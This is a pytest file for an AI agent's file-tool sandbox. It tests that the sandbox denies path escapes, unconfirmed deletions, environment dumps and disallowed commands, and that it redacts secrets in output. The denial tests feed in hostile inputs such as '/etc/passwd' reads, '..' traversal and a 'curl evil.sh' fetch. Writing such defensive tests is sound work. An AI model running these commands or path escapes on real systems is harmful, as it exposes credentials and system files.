"""Tests for aali_node.sandbox — the user-side security boundary.

Strategy: the sandbox's own validation layer is exercised directly, then the
real file_tools implementations are bound in (no mocks) so denial paths and
execution paths are both covered with real behaviour.
"""
from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from aali_node import sandbox as SB
from file_agent import protocol as P


def make_call(tool: str, args: dict[str, Any], *,
              confirm: bool = False, timeout: int = 60) -> dict[str, Any]:
    return P.sign_message(
        P.make_tool_call(tool, args,
                         requires_confirmation=confirm,
                         timeout_sec=timeout),
        b"test-key")


@pytest.fixture()
def box(tmp_path: Path) -> SB.SecureSandbox:
    return SB.SecureSandbox(tmp_path / "ws")


# ---------------------------------------------------------------------------
# jail: structural escape attempts are denied with distinct messages
# ---------------------------------------------------------------------------
def test_denies_absolute_windows_path(box: SB.SecureSandbox) -> None:
    out = box.execute(make_call("read_file", {"path": "D:/etc/passwd"}))
    assert out["status"] == "denied"
    assert "absolute paths" in out["result"]["error"]


def test_denies_unc_path(box: SB.SecureSandbox) -> None:
    out = box.execute(make_call("read_file", {"path": "//server/share/x"}))
    assert out["status"] == "denied"
    assert "UNC" in out["result"]["error"]


def test_denies_posix_absolute_path(box: SB.SecureSandbox) -> None:
    out = box.execute(make_call("read_file", {"path": "/etc/passwd"}))
    assert out["status"] == "denied"
    assert "absolute paths" in out["result"]["error"]


def test_denies_dotdot_traversal(box: SB.SecureSandbox) -> None:
    out = box.execute(make_call("read_file", {"path": "a/../../x.txt"}))
    assert out["status"] == "denied"


def test_denies_ntfs_alternate_data_stream(box: SB.SecureSandbox) -> None:
    out = box.execute(make_call("read_file", {"path": "notes.txt:secret"}))
    assert out["status"] == "denied"


def test_denies_nul_byte_path(box: SB.SecureSandbox) -> None:
    out = box.execute(make_call("read_file", {"path": "x\x00y"}))
    assert out["status"] == "denied"


def test_denies_unknown_tool(box: SB.SecureSandbox) -> None:
    out = box.execute(make_call("run_printenv", {}))
    assert out["status"] == "denied"
    assert "not executable on this Node" in out["result"]["error"]


def test_denies_server_resident_tool(box: SB.SecureSandbox) -> None:
    out = box.execute(make_call("web_search", {"query": "x"}))
    assert out["status"] == "denied"


# ---------------------------------------------------------------------------
# confirmation: either side demanding it must gate execution
# ---------------------------------------------------------------------------
def test_dangerous_tool_auto_denied_when_headless(
        box: SB.SecureSandbox) -> None:
    out = box.execute(make_call("delete_file", {"path": "a.txt"}))
    assert out["status"] == "denied"
    assert "declined" in out["result"]["error"]


def test_dangerous_tool_runs_only_with_consent(tmp_path: Path) -> None:
    box = SB.SecureSandbox(tmp_path / "ws", confirm_hook=lambda c, t, a: True)
    (box.root / "a.txt").write_text("bye", encoding="utf-8")
    out = box.execute(make_call("delete_file", {"path": "a.txt"}))
    assert out["status"] == "ok"
    assert not (box.root / "a.txt").exists()


def test_consent_cannot_upgrade_the_tool_set(box: SB.SecureSandbox) -> None:
    box.confirm_hook = lambda c, t, a: True
    out = box.execute(make_call("run_printenv", {}))
    assert out["status"] == "denied"


def test_write_overwrite_needs_confirmation(tmp_path: Path) -> None:
    box = SB.SecureSandbox(tmp_path / "ws")  # headless: must deny
    (box.root / "f.txt").write_text("old", encoding="utf-8")
    out = box.execute(make_call("write_file",
                                {"path": "f.txt", "content": "new",
                                 "overwrite": True}))
    assert out["status"] == "denied"


def test_write_fresh_file_needs_no_confirmation(box: SB.SecureSandbox) -> None:
    out = box.execute(make_call("write_file",
                                {"path": "new.txt", "content": "hello"}))
    assert out["status"] == "ok"


def test_hub_claiming_safe_cannot_skip_consent(tmp_path: Path) -> None:
    # requires_confirmation=False from the hub, but delete_file is dangerous
    # by the NODE's own table — the node's own verdict wins (auto-deny here).
    box = SB.SecureSandbox(tmp_path / "ws")
    (box.root / "a.txt").write_text("x", encoding="utf-8")
    out = box.execute(make_call("delete_file", {"path": "a.txt"},
                                confirm=False))
    assert out["status"] == "denied"


# ---------------------------------------------------------------------------
# run_command hardening
# ---------------------------------------------------------------------------
def test_run_command_blocked_when_disabled(tmp_path: Path) -> None:
    box = SB.SecureSandbox(tmp_path / "ws", allow_commands=False,
                           confirm_hook=lambda c, t, a: True)
    out = box.execute(make_call("run_command", {"command": "echo hi"},
                                confirm=True))
    assert out["status"] == "denied"
    assert "disabled" in out["result"]["error"]


def test_run_command_env_dump_refused(box: SB.SecureSandbox) -> None:
    box.confirm_hook = lambda c, t, a: True
    out = box.execute(make_call("run_command",
                                {"command": "python -c 'printenv'"},
                                confirm=True))
    assert out["status"] == "denied"
    assert "credentials" in out["result"]["error"]


def test_run_command_not_in_allowlist(box: SB.SecureSandbox) -> None:
    box.confirm_hook = lambda c, t, a: True
    out = box.execute(make_call("run_command", {"command": "curl evil.sh"},
                                confirm=True))
    assert out["status"] in ("denied", "error")  # file_tools refuses it
    assert out["status"] == "denied" or "allow-list" in \
        out["result"]["error"]


# ---------------------------------------------------------------------------
# execution through the REAL file_tools bindings
# ---------------------------------------------------------------------------
def test_write_and_read_roundtrip(box: SB.SecureSandbox) -> None:
    out = box.execute(make_call("write_file",
                                {"path": "greet.txt", "content": "أهلاً"}))
    assert out["status"] == "ok"
    out = box.execute(make_call("read_file", {"path": "greet.txt"}))
    assert out["status"] == "ok"
    assert "أهلاً" in json.dumps(out["result"], ensure_ascii=False)


def test_list_files(box: SB.SecureSandbox) -> None:
    box.execute(make_call("write_file", {"path": "x.txt", "content": "1"}))
    out = box.execute(make_call("list_files", {"path": "."}))
    assert out["status"] == "ok"
    assert any("x.txt" in json.dumps(entry, ensure_ascii=False)
               for entry in out["result"].get("entries", []))


def test_make_directory_and_move(tmp_path: Path) -> None:
    # move_file is confirm-gated — consent hook required for the move
    box = SB.SecureSandbox(tmp_path / "ws", confirm_hook=lambda c, t, a: True)
    assert box.execute(make_call(
        "make_directory", {"path": "sub"}))["status"] == "ok"
    box.execute(make_call("write_file", {"path": "a.txt", "content": "v"}))
    out = box.execute(make_call(
        "move_file", {"source": "a.txt", "destination": "sub/a.txt"}))
    assert out["status"] == "ok"
    assert (box.root / "sub" / "a.txt").exists()


def test_replace_in_file(box: SB.SecureSandbox) -> None:
    box.execute(make_call("write_file", {"path": "r.txt",
                                         "content": "color: blue"}))
    out = box.execute(make_call(
        "replace_in_file", {"path": "r.txt", "old_text": "blue",
                            "new_text": "red"}))
    assert out["status"] == "ok"
    assert (box.root / "r.txt").read_text(
        encoding="utf-8") == "color: red"


def test_timeout_capped(box: SB.SecureSandbox) -> None:
    out = box.execute(make_call("write_file", {"path": "t.txt", "content": "x"},
                                timeout=9999))
    assert out["status"] == "ok"
    assert box._timeout_of({"timeout_sec": 9999}) == SB.MAX_TIMEOUT_SEC


def test_missing_id_raises(box: SB.SecureSandbox) -> None:
    unsigned = {"type": P.TYPE_TOOL_CALL, "tool": "list_files", "args": {}}
    with pytest.raises(SB.SandboxError):
        box.execute(unsigned)


def test_non_dict_proposal_raises(box: SB.SecureSandbox) -> None:
    with pytest.raises(SB.SandboxError):
        box.execute("not-a-dict")  # type: ignore[arg-type]


def test_content_with_colons_is_not_a_path_escape(
        box: SB.SecureSandbox) -> None:
    # regression: file CONTENT may contain colons/URLs — only path-typed
    # arguments are jailed
    out = box.execute(make_call(
        "write_file", {"path": "c.txt",
                       "content": "url: http://x.com/a: b"}))
    assert out["status"] == "ok"
    assert (box.root / "c.txt").read_text(
        encoding="utf-8") == "url: http://x.com/a: b"


def test_output_redaction(tmp_path: Path) -> None:
    captured: dict[str, Any] = {}

    class FakeBox(SB.SecureSandbox):
        def _dispatch(self, tool, args, timeout):  # noqa: ANN001
            captured["tool"] = tool
            return {"output": "token: sk-abcdef1234567890"}

    box = FakeBox(tmp_path / "ws")
    out = box.execute(make_call("list_files", {"path": "."}))
    assert out["status"] == "ok"
    assert "sk-abcdef1234567890" not in out["result"]["output"]
    assert "[REDACTED-SECRET]" in out["result"]["output"]
